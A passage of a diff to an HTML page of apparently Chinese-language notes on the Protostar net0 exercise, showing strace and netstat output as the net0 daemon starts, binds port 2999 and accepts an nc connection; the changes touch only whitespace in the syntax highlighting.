-fstat64<span class="o">(</span><span class="m">3</span>, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span><span class="m">0755</span>, <span class="nv">st_size</span><span class="o">=</span><span class="m">1319176</span>, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
-mmap2<span class="o">(</span>NULL, <span class="m">1329480</span>, PROT_READ<span class="p">|</span>PROT_EXEC, MAP_PRIVATE<span class="p">|</span>MAP_DENYWRITE, <span class="m">3</span>, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7e97000
-mprotect<span class="o">(</span>0xb7fd5000, <span class="m">4096</span>, PROT_NONE<span class="o">)</span>   <span class="o">=</span> <span class="m">0</span>
-mmap2<span class="o">(</span>0xb7fd6000, <span class="m">12288</span>, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE, <span class="m">3</span>, 0x13e<span class="o">)</span> <span class="o">=</span> 0xb7fd6000
-mmap2<span class="o">(</span>0xb7fd9000, <span class="m">10568</span>, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_ANONYMOUS, -1, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7fd9000
-close<span class="o">(</span><span class="m">3</span><span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
-mmap2<span class="o">(</span>NULL, <span class="m">4096</span>, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7e96000
-set_thread_area<span class="o">({</span>entry_number:-1 -&gt; <span class="m">6</span>, base_addr:0xb7e966c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
-mprotect<span class="o">(</span>0xb7fd6000, <span class="m">8192</span>, PROT_READ<span class="o">)</span>   <span class="o">=</span> <span class="m">0</span>
-mprotect<span class="o">(</span>0xb7ffe000, <span class="m">4096</span>, PROT_READ<span class="o">)</span>   <span class="o">=</span> <span class="m">0</span>
-munmap<span class="o">(</span>0xb7fdc000, <span class="m">13796</span><span class="o">)</span>               <span class="o">=</span> <span class="m">0</span>
-rt_sigaction<span class="o">(</span>SIGCHLD, <span class="o">{</span>0x8048dc4, <span class="o">[</span>CHLD<span class="o">]</span>, SA_RESTART<span class="o">}</span>, <span class="o">{</span>SIG_DFL, <span class="o">[]</span>, <span class="m">0</span><span class="o">}</span>, <span class="m">8</span><span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
-rt_sigaction<span class="o">(</span>SIGPIPE, <span class="o">{</span>SIG_IGN, <span class="o">[</span>PIPE<span class="o">]</span>, SA_RESTART<span class="o">}</span>, <span class="o">{</span>SIG_DFL, <span class="o">[]</span>, <span class="m">0</span><span class="o">}</span>, <span class="m">8</span><span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
-open<span class="o">(</span><span class="s2">&quot;/opt/protostar/run/net0.pid&quot;</span>, O_RDWR<span class="p">|</span>O_CREAT<span class="p">|</span>O_TRUNC, <span class="m">0700</span><span class="o">)</span> <span class="o">=</span> <span class="m">3</span>   <span class="c1"># 3 for filedescriptor</span>
-setgroups32<span class="o">(</span><span class="m">1</span>, <span class="o">[</span><span class="m">999</span><span class="o">])</span>                   <span class="o">=</span> <span class="m">0</span>
-setresgid32<span class="o">(</span><span class="m">999</span>, <span class="m">999</span>, <span class="m">999</span><span class="o">)</span>              <span class="o">=</span> <span class="m">0</span>
-setresuid32<span class="o">(</span><span class="m">999</span>, <span class="m">999</span>, <span class="m">999</span><span class="o">)</span>              <span class="o">=</span> <span class="m">0</span>
-clone<span class="o">(</span>Process <span class="m">17423</span> attached
-<span class="nv">child_stack</span><span class="o">=</span><span class="m">0</span>, <span class="nv">flags</span><span class="o">=</span>CLONE_CHILD_CLEARTID<span class="p">|</span>CLONE_CHILD_SETTID<span class="p">|</span>SIGCHLD, <span class="nv">child_tidptr</span><span class="o">=</span>0xb7e96728<span class="o">)</span> <span class="o">=</span> <span class="m">17423</span>
-<span class="o">[</span>pid <span class="m">17422</span><span class="o">]</span> exit_group<span class="o">(</span><span class="m">0</span><span class="o">)</span>               <span class="o">=</span> ? <span class="c1"># parent exit</span>
-setsid<span class="o">()</span>                                <span class="o">=</span> <span class="m">17423</span> <span class="c1"># attached to the new process</span>
-chdir<span class="o">(</span><span class="s2">&quot;/&quot;</span><span class="o">)</span>                              <span class="o">=</span> <span class="m">0</span>
-open<span class="o">(</span><span class="s2">&quot;/dev/null&quot;</span>, O_RDWR<span class="o">)</span>               <span class="o">=</span> <span class="m">4</span>
-fstat64<span class="o">(</span><span class="m">4</span>, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span><span class="m">0666</span>, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span><span class="m">1</span>, <span class="m">3</span><span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
-dup2<span class="o">(</span><span class="m">4</span>, <span class="m">0</span><span class="o">)</span>                              <span class="o">=</span> <span class="m">0</span> <span class="c1"># stdin</span>
-dup2<span class="o">(</span><span class="m">4</span>, <span class="m">1</span><span class="o">)</span>                              <span class="o">=</span> <span class="m">1</span> <span class="c1"># stdout</span>
-dup2<span class="o">(</span><span class="m">4</span>, <span class="m">2</span><span class="o">)</span>                              <span class="o">=</span> <span class="m">2</span> <span class="c1"># stderr</span>
+execve<span class="o">(</span><span class="s2">&quot;./net0&quot;</span>,<span class="w"> </span><span class="o">[</span><span class="s2">&quot;./net0&quot;</span><span class="o">]</span>,<span class="w"> </span><span class="o">[</span>/*<span class="w"> </span><span class="m">24</span><span class="w"> </span>vars<span class="w"> </span>*/<span class="o">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+brk<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="w">                                  </span><span class="o">=</span><span class="w"> </span>0x804b000
+access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.nohwcap&quot;</span>,<span class="w"> </span>F_OK<span class="o">)</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>-1<span class="w"> </span>ENOENT<span class="w"> </span><span class="o">(</span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory<span class="o">)</span>
+mmap2<span class="o">(</span>NULL,<span class="w"> </span><span class="m">8192</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_WRITE,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS,<span class="w"> </span>-1,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7fe0000
+access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.preload&quot;</span>,<span class="w"> </span>R_OK<span class="o">)</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>-1<span class="w"> </span>ENOENT<span class="w"> </span><span class="o">(</span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory<span class="o">)</span>
+open<span class="o">(</span><span class="s2">&quot;/etc/ld.so.cache&quot;</span>,<span class="w"> </span>O_RDONLY<span class="o">)</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
+fstat64<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span><span class="m">0644</span>,<span class="w"> </span><span class="nv">st_size</span><span class="o">=</span><span class="m">13796</span>,<span class="w"> </span>...<span class="o">})</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mmap2<span class="o">(</span>NULL,<span class="w"> </span><span class="m">13796</span>,<span class="w"> </span>PROT_READ,<span class="w"> </span>MAP_PRIVATE,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7fdc000
+close<span class="o">(</span><span class="m">3</span><span class="o">)</span><span class="w">                                </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.nohwcap&quot;</span>,<span class="w"> </span>F_OK<span class="o">)</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>-1<span class="w"> </span>ENOENT<span class="w"> </span><span class="o">(</span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory<span class="o">)</span>
+open<span class="o">(</span><span class="s2">&quot;/lib/libc.so.6&quot;</span>,<span class="w"> </span>O_RDONLY<span class="o">)</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
+read<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="s2">&quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\320m\1\0004\0\0\0&quot;</span>...,<span class="w"> </span><span class="m">512</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">512</span>
+fstat64<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span><span class="m">0755</span>,<span class="w"> </span><span class="nv">st_size</span><span class="o">=</span><span class="m">1319176</span>,<span class="w"> </span>...<span class="o">})</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mmap2<span class="o">(</span>NULL,<span class="w"> </span><span class="m">1329480</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_EXEC,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_DENYWRITE,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7e97000
+mprotect<span class="o">(</span>0xb7fd5000,<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>PROT_NONE<span class="o">)</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mmap2<span class="o">(</span>0xb7fd6000,<span class="w"> </span><span class="m">12288</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_WRITE,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span>0x13e<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7fd6000
+mmap2<span class="o">(</span>0xb7fd9000,<span class="w"> </span><span class="m">10568</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_WRITE,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_ANONYMOUS,<span class="w"> </span>-1,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7fd9000
+close<span class="o">(</span><span class="m">3</span><span class="o">)</span><span class="w">                                </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mmap2<span class="o">(</span>NULL,<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_WRITE,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS,<span class="w"> </span>-1,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7e96000
+set_thread_area<span class="o">({</span>entry_number:-1<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">6</span>,<span class="w"> </span>base_addr:0xb7e966c0,<span class="w"> </span>limit:1048575,<span class="w"> </span>seg_32bit:1,<span class="w"> </span>contents:0,<span class="w"> </span>read_exec_only:0,<span class="w"> </span>limit_in_pages:1,<span class="w"> </span>seg_not_present:0,<span class="w"> </span>useable:1<span class="o">})</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mprotect<span class="o">(</span>0xb7fd6000,<span class="w"> </span><span class="m">8192</span>,<span class="w"> </span>PROT_READ<span class="o">)</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mprotect<span class="o">(</span>0xb7ffe000,<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>PROT_READ<span class="o">)</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+munmap<span class="o">(</span>0xb7fdc000,<span class="w"> </span><span class="m">13796</span><span class="o">)</span><span class="w">               </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+rt_sigaction<span class="o">(</span>SIGCHLD,<span class="w"> </span><span class="o">{</span>0x8048dc4,<span class="w"> </span><span class="o">[</span>CHLD<span class="o">]</span>,<span class="w"> </span>SA_RESTART<span class="o">}</span>,<span class="w"> </span><span class="o">{</span>SIG_DFL,<span class="w"> </span><span class="o">[]</span>,<span class="w"> </span><span class="m">0</span><span class="o">}</span>,<span class="w"> </span><span class="m">8</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+rt_sigaction<span class="o">(</span>SIGPIPE,<span class="w"> </span><span class="o">{</span>SIG_IGN,<span class="w"> </span><span class="o">[</span>PIPE<span class="o">]</span>,<span class="w"> </span>SA_RESTART<span class="o">}</span>,<span class="w"> </span><span class="o">{</span>SIG_DFL,<span class="w"> </span><span class="o">[]</span>,<span class="w"> </span><span class="m">0</span><span class="o">}</span>,<span class="w"> </span><span class="m">8</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+open<span class="o">(</span><span class="s2">&quot;/opt/protostar/run/net0.pid&quot;</span>,<span class="w"> </span>O_RDWR<span class="p">|</span>O_CREAT<span class="p">|</span>O_TRUNC,<span class="w"> </span><span class="m">0700</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span><span class="w">   </span><span class="c1"># 3 for filedescriptor</span>
+setgroups32<span class="o">(</span><span class="m">1</span>,<span class="w"> </span><span class="o">[</span><span class="m">999</span><span class="o">])</span><span class="w">                   </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+setresgid32<span class="o">(</span><span class="m">999</span>,<span class="w"> </span><span class="m">999</span>,<span class="w"> </span><span class="m">999</span><span class="o">)</span><span class="w">              </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+setresuid32<span class="o">(</span><span class="m">999</span>,<span class="w"> </span><span class="m">999</span>,<span class="w"> </span><span class="m">999</span><span class="o">)</span><span class="w">              </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+clone<span class="o">(</span>Process<span class="w"> </span><span class="m">17423</span><span class="w"> </span>attached
+<span class="nv">child_stack</span><span class="o">=</span><span class="m">0</span>,<span class="w"> </span><span class="nv">flags</span><span class="o">=</span>CLONE_CHILD_CLEARTID<span class="p">|</span>CLONE_CHILD_SETTID<span class="p">|</span>SIGCHLD,<span class="w"> </span><span class="nv">child_tidptr</span><span class="o">=</span>0xb7e96728<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">17423</span>
+<span class="o">[</span>pid<span class="w"> </span><span class="m">17422</span><span class="o">]</span><span class="w"> </span>exit_group<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="w">               </span><span class="o">=</span><span class="w"> </span>?<span class="w"> </span><span class="c1"># parent exit</span>
+setsid<span class="o">()</span><span class="w">                                </span><span class="o">=</span><span class="w"> </span><span class="m">17423</span><span class="w"> </span><span class="c1"># attached to the new process</span>
+chdir<span class="o">(</span><span class="s2">&quot;/&quot;</span><span class="o">)</span><span class="w">                              </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+open<span class="o">(</span><span class="s2">&quot;/dev/null&quot;</span>,<span class="w"> </span>O_RDWR<span class="o">)</span><span class="w">               </span><span class="o">=</span><span class="w"> </span><span class="m">4</span>
+fstat64<span class="o">(</span><span class="m">4</span>,<span class="w"> </span><span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span><span class="m">0666</span>,<span class="w"> </span><span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span><span class="m">1</span>,<span class="w"> </span><span class="m">3</span><span class="o">)</span>,<span class="w"> </span>...<span class="o">})</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+dup2<span class="o">(</span><span class="m">4</span>,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w">                              </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="c1"># stdin</span>
+dup2<span class="o">(</span><span class="m">4</span>,<span class="w"> </span><span class="m">1</span><span class="o">)</span><span class="w">                              </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="c1"># stdout</span>
+dup2<span class="o">(</span><span class="m">4</span>,<span class="w"> </span><span class="m">2</span><span class="o">)</span><span class="w">                              </span><span class="o">=</span><span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="c1"># stderr</span>
 <span class="c1"># bend all standard streams to /dev/null</span>
-close<span class="o">(</span><span class="m">4</span><span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
-write<span class="o">(</span><span class="m">3</span>, <span class="s2">&quot;17423\n&quot;</span>, <span class="m">6</span><span class="o">)</span>                  <span class="o">=</span> <span class="m">6</span> <span class="c1"># write child&#39;s process id to net0.pid</span>
-close<span class="o">(</span><span class="m">3</span><span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
-socket<span class="o">(</span>PF_INET, SOCK_STREAM, IPPROTO_IP<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
-setsockopt<span class="o">(</span><span class="m">3</span>, SOL_SOCKET, SO_REUSEADDR, <span class="o">[</span><span class="m">1</span><span class="o">]</span>, <span class="m">4</span><span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
-bind<span class="o">(</span><span class="m">3</span>, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span><span class="m">2999</span><span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="o">)}</span>, <span class="m">16</span><span class="o">)</span> <span class="o">=</span> -1 EADDRINUSE <span class="o">(</span>Address already <span class="k">in</span> use<span class="o">)</span>
+close<span class="o">(</span><span class="m">4</span><span class="o">)</span><span class="w">                                </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+write<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="s2">&quot;17423\n&quot;</span>,<span class="w"> </span><span class="m">6</span><span class="o">)</span><span class="w">                  </span><span class="o">=</span><span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="c1"># write child&#39;s process id to net0.pid</span>
+close<span class="o">(</span><span class="m">3</span><span class="o">)</span><span class="w">                                </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+socket<span class="o">(</span>PF_INET,<span class="w"> </span>SOCK_STREAM,<span class="w"> </span>IPPROTO_IP<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
+setsockopt<span class="o">(</span><span class="m">3</span>,<span class="w"> </span>SOL_SOCKET,<span class="w"> </span>SO_REUSEADDR,<span class="w"> </span><span class="o">[</span><span class="m">1</span><span class="o">]</span>,<span class="w"> </span><span class="m">4</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+bind<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET,<span class="w"> </span><span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span><span class="m">2999</span><span class="o">)</span>,<span class="w"> </span><span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="o">)}</span>,<span class="w"> </span><span class="m">16</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>-1<span class="w"> </span>EADDRINUSE<span class="w"> </span><span class="o">(</span>Address<span class="w"> </span>already<span class="w"> </span><span class="k">in</span><span class="w"> </span>use<span class="o">)</span>
 <span class="c1"># bind this process to port 2999</span>
-write<span class="o">(</span><span class="m">2</span>, <span class="s2">&quot;serve_forever: unable to bind():&quot;</span>..., <span class="m">56</span><span class="o">)</span> <span class="o">=</span> <span class="m">56</span>
-exit_group<span class="o">(</span><span class="m">6</span><span class="o">)</span>                           <span class="o">=</span> ?
-Process <span class="m">17423</span> detached
+write<span class="o">(</span><span class="m">2</span>,<span class="w"> </span><span class="s2">&quot;serve_forever: unable to bind():&quot;</span>...,<span class="w"> </span><span class="m">56</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">56</span>
+exit_group<span class="o">(</span><span class="m">6</span><span class="o">)</span><span class="w">                           </span><span class="o">=</span><span class="w"> </span>?
+Process<span class="w"> </span><span class="m">17423</span><span class="w"> </span>detached
 </code></pre></div>
 </li>
 <li>
 <p>重新启动 <code>net0</code> 并跟踪</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># killall net0</span>
 <span class="c1"># strace -f ./net0</span>
-execve<span class="o">(</span><span class="s2">&quot;./net0&quot;</span>, <span class="o">[</span><span class="s2">&quot;./net0&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">24</span> vars */<span class="o">])</span> <span class="o">=</span> <span class="m">0</span>
+execve<span class="o">(</span><span class="s2">&quot;./net0&quot;</span>,<span class="w"> </span><span class="o">[</span><span class="s2">&quot;./net0&quot;</span><span class="o">]</span>,<span class="w"> </span><span class="o">[</span>/*<span class="w"> </span><span class="m">24</span><span class="w"> </span>vars<span class="w"> </span>*/<span class="o">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
 ...
-socket<span class="o">(</span>PF_INET, SOCK_STREAM, IPPROTO_IP<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
-setsockopt<span class="o">(</span><span class="m">3</span>, SOL_SOCKET, SO_REUSEADDR, <span class="o">[</span><span class="m">1</span><span class="o">]</span>, <span class="m">4</span><span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
-bind<span class="o">(</span><span class="m">3</span>, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span><span class="m">2999</span><span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="o">)}</span>, <span class="m">16</span><span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
-listen<span class="o">(</span><span class="m">3</span>, <span class="m">10</span><span class="o">)</span>                           <span class="o">=</span> <span class="m">0</span> <span class="c1"># listen on the port</span>
-accept<span class="o">(</span><span class="m">3</span>,   <span class="c1"># waiting for a packet to arrive</span>
+socket<span class="o">(</span>PF_INET,<span class="w"> </span>SOCK_STREAM,<span class="w"> </span>IPPROTO_IP<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
+setsockopt<span class="o">(</span><span class="m">3</span>,<span class="w"> </span>SOL_SOCKET,<span class="w"> </span>SO_REUSEADDR,<span class="w"> </span><span class="o">[</span><span class="m">1</span><span class="o">]</span>,<span class="w"> </span><span class="m">4</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+bind<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET,<span class="w"> </span><span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span><span class="m">2999</span><span class="o">)</span>,<span class="w"> </span><span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="o">)}</span>,<span class="w"> </span><span class="m">16</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+listen<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="m">10</span><span class="o">)</span><span class="w">                           </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="c1"># listen on the port</span>
+accept<span class="o">(</span><span class="m">3</span>,<span class="w">   </span><span class="c1"># waiting for a packet to arrive</span>
 </code></pre></div>
 </li>
 <li>
@@ -2893,29 +2907,29 @@ accept<span class="o">(</span><span class="m">3</span>,   <span class="c1"># wai
 <span class="c1"># -a, --all, --listening - display all sockets (default: connected)</span>
 <span class="c1"># -n, --numeric - don&#39;t resolve names</span>
 <span class="c1"># &lt;Socket&gt;={-t|--tcp}</span>
-Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-...       
-tcp        <span class="m">0</span>      <span class="m">0</span> <span class="m">0</span>.0.0.0:2998            <span class="m">0</span>.0.0.0:*               LISTEN      <span class="m">1507</span>/net1       
-tcp        <span class="m">0</span>      <span class="m">0</span> <span class="m">0</span>.0.0.0:2999            <span class="m">0</span>.0.0.0:*               LISTEN      <span class="m">17964</span>/net0      
-tcp        <span class="m">0</span>      <span class="m">0</span> <span class="m">127</span>.0.0.1:25            <span class="m">0</span>.0.0.0:*               LISTEN      <span class="m">1479</span>/exim4      
+Active<span class="w"> </span>Internet<span class="w"> </span>connections<span class="w"> </span><span class="o">(</span>servers<span class="w"> </span>and<span class="w"> </span>established<span class="o">)</span>
+Proto<span class="w"> </span>Recv-Q<span class="w"> </span>Send-Q<span class="w"> </span>Local<span class="w"> </span>Address<span class="w">           </span>Foreign<span class="w"> </span>Address<span class="w">         </span>State<span class="w">       </span>PID/Program<span class="w"> </span>name
+...<span class="w">       </span>
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:2998<span class="w">            </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">1507</span>/net1<span class="w">       </span>
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:2999<span class="w">            </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">17964</span>/net0<span class="w">      </span>
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:25<span class="w">            </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">1479</span>/exim4<span class="w">      </span>
 ...
 </code></pre></div>
 </li>
 <li>
 <p><code>nc</code> 建立连接后，函数 <code>accept</code> 返回</p>
-<div class="highlight"><pre><span></span><code>accept<span class="o">(</span><span class="m">3</span>, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span><span class="m">36218</span><span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="o">)}</span>, <span class="o">[</span><span class="m">16</span><span class="o">])</span> <span class="o">=</span> <span class="m">4</span>
-clone<span class="o">(</span>Process <span class="m">18005</span> attached    <span class="c1"># 再次调用 clone，从而能支持多用户并发</span>
-<span class="nv">child_stack</span><span class="o">=</span><span class="m">0</span>, <span class="nv">flags</span><span class="o">=</span>CLONE_CHILD_CLEARTID<span class="p">|</span>CLONE_CHILD_SETTID<span class="p">|</span>SIGCHLD, <span class="nv">child_tidptr</span><span class="o">=</span>0xb7e96728<span class="o">)</span> <span class="o">=</span> <span class="m">18005</span>
-<span class="o">[</span>pid <span class="m">17964</span><span class="o">]</span> close<span class="o">(</span><span class="m">4</span><span class="o">)</span>                    <span class="o">=</span> <span class="m">0</span>
-<span class="o">[</span>pid <span class="m">17964</span><span class="o">]</span> accept<span class="o">(</span><span class="m">3</span>,  &lt;unfinished ...&gt;
-<span class="o">[</span>pid <span class="m">18005</span><span class="o">]</span> close<span class="o">(</span><span class="m">3</span><span class="o">)</span>                    <span class="o">=</span> <span class="m">0</span>
-<span class="o">[</span>pid <span class="m">18005</span><span class="o">]</span> dup2<span class="o">(</span><span class="m">4</span>, <span class="m">0</span><span class="o">)</span>                  <span class="o">=</span> <span class="m">0</span>
-<span class="o">[</span>pid <span class="m">18005</span><span class="o">]</span> dup2<span class="o">(</span><span class="m">4</span>, <span class="m">1</span><span class="o">)</span>                  <span class="o">=</span> <span class="m">1</span>
-<span class="o">[</span>pid <span class="m">18005</span><span class="o">]</span> dup2<span class="o">(</span><span class="m">4</span>, <span class="m">2</span><span class="o">)</span>                  <span class="o">=</span> <span class="m">2</span>
-<span class="o">[</span>pid <span class="m">18005</span><span class="o">]</span> time<span class="o">(</span>NULL<span class="o">)</span>                  <span class="o">=</span> <span class="m">1662378390</span>
-<span class="o">[</span>pid <span class="m">18005</span><span class="o">]</span> write<span class="o">(</span><span class="m">1</span>, <span class="s2">&quot;Please send &#39;1923281790&#39; as a li&quot;</span>..., <span class="m">54</span><span class="o">)</span> <span class="o">=</span> <span class="m">54</span>    <span class="c1"># printf</span>
-<span class="o">[</span>pid <span class="m">18005</span><span class="o">]</span> read<span class="o">(</span><span class="m">0</span>, 
